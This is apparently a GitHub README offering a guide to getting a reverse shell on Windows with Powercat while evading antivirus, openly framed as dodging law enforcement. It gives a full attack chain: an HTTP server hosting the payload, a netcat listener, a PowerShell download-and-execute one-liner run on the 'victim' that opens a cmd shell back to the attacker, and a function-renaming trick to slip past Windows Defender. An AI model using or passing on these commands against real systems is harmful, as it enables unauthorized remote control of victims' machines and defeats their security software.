<p align="left"><img src="https://1.bp.blogspot.com/-9XD4hpjvMFU/X1rLweYaGcI/AAAAAAAATws/ufmAagnmV9o2k0EPUmis9r6M-B25wOYmACNcBGAsYHQ/s1600/HTTP-revshell_5_logo.png" width="50%" height="50%"></p>

# Powercat-v2.0 Reverseshell Guide
A guide to evade the boys in blue when acquiring a reverse shell on Windows using Powercat v2 

## About this Guide
This guide allows you to acquire a reverse shell while bypassing anti-virus software on a Windows computer using a single Powershell script.

Powercat is essentially the powershell version of netcat. It is a network utility for performing low-privilege network communication operations that makes use of native PowerShell version 2 components. 

# Usage
Clone this repository and change the working directory
```
git clone https://github.com/rexpository/reverseshell-powercat-v2.git
cd reverseshell-powercat-v2
```

Start a Python HTTP server on a port of your choice (e.g., 70) for the victim to access the script
```
python -m SimpleHTTPServer 70
```

Start a Netcat listener on a port of your choice (e.g., 5555) for obtaining a reverse connection
```
sudo apt-get install netcat
nc -lp 5555
```

On your Windows victim machine, run the following Powershell command inside the command prompt (CMD). 
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:70/powercat.ps1');powerrcatt -c YOURIP -p 5555 -e cmd"
```
Note: YOURIP should be your host's local IP address (Linux IP address); make sure to replace ports 70 and 5555 in the command with your own configurations.

You will obtain a reverse shell in the Netcat listener once the command is executed. To check what account type you're logged into, use the command *whoami*. 

<p align="left"><img src="./Demo.png" width="60%" height="60%"></p>

# Evading Anti-virus
For the time being, if the powershell script is detected as malware by Windows Defender or other anti-virus software, this issue can be resolved by changing the name of the powerrcatt function.

Open up *powercat.ps1* with ur favorite text editor and change the name of the function powerrcatt to whatever you would like (e.g., powerrrrcat)

Original script:
```
function powerrcatt
{
  param(
    [alias("Client")][string]$c="",
    [alias("Listen")][switch]$l=$False,
    ...
```
Updated script:
```
function powerrrrcat
{
  param(
    [alias("Client")][string]$c="",
    [alias("Listen")][switch]$l=$False,
    ...
```

Make sure that you update the powershell command from earlier to reflect these changes:

Original command:
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:70/powercat.ps1');powerrcatt -c YOURIP -p 5555 -e cmd"
```
Updated command:
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:70/powercat.ps1');powerrrrcat -c YOURIP -p 5555 -e cmd"
```

# Credits
- Credits to @besimorhino for developing powercat
- Check out the official documentation here: https://github.com/besimorhino/powercat
